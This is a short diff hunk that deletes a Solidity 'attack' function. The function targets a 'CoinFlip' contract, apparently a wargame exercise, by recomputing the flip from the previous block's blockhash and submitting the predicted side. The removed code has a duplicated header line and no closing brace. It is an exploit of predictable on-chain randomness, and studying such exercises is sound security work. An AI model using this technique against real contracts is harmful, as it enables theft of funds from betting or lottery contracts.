@@ -1,8 +1,0 @@
-function attack(address _victim) public   returns (bool) {
-function attack(address _victim) public   returns (bool) {
-    CoinFlip victim = CoinFlip(_victim);
-    uint256 blockValue = uint256(blockhash(block.number - 1));
-    uint256 coinFlip = blockValue / FACTOR;
-    bool side = coinFlip == 1 ? true : false;
-    victim.flip(side);
-    return side;
